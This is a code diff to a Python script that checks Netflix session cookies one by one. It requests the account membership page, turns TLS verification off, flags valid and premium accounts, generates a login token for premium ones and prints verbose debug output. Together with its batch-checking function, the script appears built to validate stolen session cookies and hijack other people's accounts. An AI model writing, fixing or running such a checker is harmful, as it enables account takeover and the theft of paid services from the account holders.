@@ -272,24 +272,87 @@ def extract_account_info(response_text: str) -> Dict:
     return info
 
 def check_single_cookie(cookies: Dict) -> Dict:
+    """Check a single cookie against Netflix API with FULL DEBUGGING"""
     session = requests.Session()
-    session.cookies.update(cookies)
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"}
+    
+    # Set cookies with proper domain
+    for name, value in cookies.items():
+        session.cookies.set(name, value, domain=".netflix.com")
+    
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36'
+    }
+    
     result = {"valid": False, "premium": False, "info": None, "nftoken": None, "error": None}
+    
+    # DEBUG: Print what we're checking
+    netflix_id = cookies.get('NetflixId', 'NOT_FOUND')
+    print(f"\n{'='*50}")
+    print(f"🔍 CHECKING COOKIE:")
+    print(f"   NetflixId: {netflix_id[:50]}..." if len(netflix_id) > 50 else f"   NetflixId: {netflix_id}")
+    print(f"{'='*50}")
+    
     try:
-        resp = session.get("https://www.netflix.com/account/membership", headers=headers, timeout=REQUEST_TIMEOUT)
-        if resp.status_code == 200:
-            info = extract_account_info(resp.text)
-            if info.get("country"):
-                result["valid"] = True
-                result["info"] = info
-                if "premium" in info.get("plan", "").lower():
-                    result["premium"] = True
-                    result["nftoken"] = create_nftoken(cookies)
+        resp = session.get(
+            'https://www.netflix.com/account/membership',
+            headers=headers,
+            timeout=REQUEST_TIMEOUT,
+            verify=False
+        )
+        
+        print(f"📡 RESPONSE:")
+        print(f"   Status Code: {resp.status_code}")
+        print(f"   Final URL: {resp.url}")
+        print(f"   Content Length: {len(resp.text)} chars")
+        
+        if 'login' in resp.url.lower():
+            print(f"❌ RESULT: Redirected to login page → INVALID/EXPIRED COOKIE")
+            result["error"] = "Redirected to login page"
+            
+        elif resp.status_code == 200:
+            has_country = 'currentCountry' in resp.text or 'countryOfSignup' in resp.text
+            has_membership = 'membershipStatus' in resp.text or 'currentPlan' in resp.text
+            
+            print(f"   Has country data: {has_country}")
+            print(f"   Has membership data: {has_membership}")
+            
+            if has_country:
+                info = extract_account_info(resp.text)
+                if info.get("country"):
+                    result["valid"] = True
+                    result["info"] = info
+                    print(f"✅ RESULT: VALID ACCOUNT!")
+                    print(f"   Country: {info.get('country')}")
+                    print(f"   Plan: {info.get('plan')}")
+                    
+                    if "premium" in info.get("plan", "").lower():
+                        result["premium"] = True
+                        print(f"   ✨ This is a PREMIUM account!")
+                        result["nftoken"] = create_nftoken(cookies)
+                else:
+                    print(f"⚠️ RESULT: Has country but extraction failed")
+                    result["error"] = "Extraction failed"
+            else:
+                print(f"⚠️ RESULT: No account data in response")
+                print(f"   Response preview: {resp.text[:500]}")
+                result["error"] = "No account data in response"
+        else:
+            print(f"❌ RESULT: HTTP Error {resp.status_code}")
+            result["error"] = f"HTTP {resp.status_code}"
+            
+    except requests.exceptions.Timeout:
+        print(f"❌ RESULT: Timeout")
+        result["error"] = "Timeout"
+    except requests.exceptions.ConnectionError as e:
+        print(f"❌ RESULT: Connection Error - {str(e)[:100]}")
+        result["error"] = f"Connection Error"
     except Exception as e:
+        print(f"❌ RESULT: Exception - {type(e).__name__}: {str(e)[:100]}")
         result["error"] = str(e)[:100]
     finally:
         session.close()
+    
+    print(f"{'='*50}\n")
     return result
 
 def check_cookies_batch(cookies_list: List[Dict], progress_callback=None) -> List[Dict]:
